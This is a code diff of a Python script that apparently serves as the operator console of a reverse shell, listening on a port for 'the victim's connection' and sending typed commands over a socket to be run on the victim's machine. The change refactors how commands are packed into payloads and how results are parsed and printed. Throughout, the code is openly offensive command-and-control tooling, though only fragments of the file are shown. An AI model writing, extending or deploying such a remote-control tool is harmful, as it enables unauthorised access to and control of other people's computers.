@@ -1,6 +1,7 @@
 import socket
 import sys
-from payload import Payload
+from command_payload import CommandPayload
+from command_payload import parse_payload_to_output
 from secure_socket import SecureSocket
 
 # Port listening for the victim's connection
@@ -37,6 +38,7 @@ def create_socket():
     while True:
         prompt = "Send command (type \"-> help\" to help): " if output_style == "full" else ">"
         command = input(prompt)
+
         # Parse custom commands
         if command.split(" ")[0] == "->":
             custom_command = command.split(" ")[1]
@@ -46,12 +48,15 @@ def create_socket():
         if len(command) == 0:
             continue
 
+        # Send command
         command = bytes(command, encoding='utf-8')
-        secure_socket.send(command)
-        packet = secure_socket.receive()
-        payload = Payload(raw_packet=packet)
+        payload = CommandPayload(command=command)
+        packet = payload.pack()
+        secure_socket.send(packet)
 
-        print(payload.format_output(output_style))
+        # Receive result
+        payload = secure_socket.receive(parse_payload_to_output)
+        print(payload.formatted_output(output_style))
 
 
 def show_logo():
